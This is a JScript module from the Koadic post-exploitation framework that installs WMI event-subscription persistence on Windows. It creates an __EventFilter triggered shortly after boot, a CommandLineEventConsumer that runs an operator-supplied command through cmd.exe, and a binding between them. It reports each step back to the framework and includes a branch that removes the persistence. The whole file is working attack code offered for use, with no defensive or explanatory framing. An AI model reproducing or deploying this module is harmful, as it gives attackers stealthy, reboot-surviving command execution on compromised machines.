try
{

    var headers = {};
    var subname = "K0adic";

    if (~CLEANUP~)
    {
        var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        wmi.Delete("\\\\.\\root\\subscription:__EventFilter.Name=\""+subname+"\"");
        wmi.Delete("\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\""+subname+"\"");
        var ftcb = wmi.Get("__FilterToConsumerBinding").Instances_();
        var instancecount = ftcb.Count;
        var i;
        for (i = 0; i < instancecount; i++) {
            var cons = ftcb.ItemIndex(i);
            if (cons.Consumer.indexOf(subname) != -1) {
                cons.Delete_();
            }
        }
        headers["Task"] = "RemovePersistence";
        Koadic.work.report("done", headers);
    }
    else
    {
        var comspec = Koadic.shell.exec("echo %comspec%", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
        comspec = comspec.split(" \r\n")[0];

        var wmi1 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        var eventfilterclass = wmi1.Get("__EventFilter");
        var eventfilter = eventfilterclass.SpawnInstance_();
        eventfilter.Name = subname;
        eventfilter.EventNameSpace = "root\\Cimv2";
        eventfilter.QueryLanguage = "WQL";
        eventfilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300";
        var res = eventfilter.Put_();
        headers["Task"] = "CreateFilter";
        Koadic.work.report(res.Path, headers);

        var wmi2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        var commandlineeventclass = wmi2.Get("CommandLineEventConsumer");
        var commandlineevent = commandlineeventclass.SpawnInstance_();
        commandlineevent.Name = subname;
        commandlineevent.CommandLineTemplate = comspec+" /q /c ~CMD~";
        commandlineevent.RunInteractively = "false";
        res = commandlineevent.Put_();
        headers["Task"] = "CreateConsumer";
        Koadic.work.report(res.Path, headers);

        var wmi3 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
        var filtertoconsumerbindingclass = wmi3.Get("__FilterToConsumerBinding");
        var filtertoconsumerbinding = filtertoconsumerbindingclass.SpawnInstance_();
        filtertoconsumerbinding.Filter = "__EventFilter.Name=\""+subname+"\"";
        filtertoconsumerbinding.Consumer = "CommandLineEventConsumer.Name=\""+subname+"\"";
        res = filtertoconsumerbinding.Put_();
        headers["Task"] = "CreateBinding";
        Koadic.work.report(res.Path, headers);
    }
    Koadic.work.report("Complete");
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
